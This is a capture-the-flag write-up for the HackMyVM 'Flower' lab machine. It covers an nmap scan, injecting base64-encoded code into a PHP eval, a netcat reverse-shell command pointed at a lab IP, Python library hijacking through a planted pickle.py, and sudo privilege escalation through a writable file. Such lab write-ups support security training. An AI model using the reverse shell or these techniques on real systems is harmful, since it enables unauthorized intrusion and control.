# HackMyVM-Flower

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-12 02:02 PKT
Nmap scan report for dominator.hmv (192.168.1.6)
Host is up (0.000079s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:8D:A3:F6 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```
## PORT 80

<img src="https://imgur.com/j2fvA9B.png"/>

On running gobuster it seems that there is only an `index.php` 

<img src="https://imgur.com/Yy5KCwp.png"/>

Looking at the source code of  web page we see that value is actually a base64 encoded text 

<img src="https://imgur.com/aw9Zpp7.png"/>

These value are being sent to the sever and the server might be using `eval` so there is an exploit to it by ecnoding the exploit as base64 and replacing it with the actual value.

<img src="https://imgur.com/NjoGb9z.png"/>

<img src="https://imgur.com/1m3en2N.png"/>

<img src="https://imgur.com/GSTIEYH.png"/>

To get a reverse shell encode `system('nc 192.168.1.8 2222 -e /bin/bash') ` to base64 and do the exact same thing

<img src="https://imgur.com/VDkf22z.png"/>

<img src="https://imgur.com/g146zXb.png"/>

Now we know `diary.py` can be ran as user `rose` and we know that it is using python library named `pickle`

<img src="https://imgur.com/UCvsGdJ.png"/>

We can create a malicious library by the name of pickle.py and place it with diary.py because python searches for library in which it is being executed.

<img src="https://imgur.com/vb28U6l.png"/>

Doing a `sudo -l` again with rose

<img src="https://imgur.com/EdfbRYb.png"/>

<img src="https://imgur.com/kWbNTur.png"/>

As `.plantbook` is writeable add `/bin/bash` to the file and then run as root

<img src="https://imgur.com/AYNV9ve.png"/>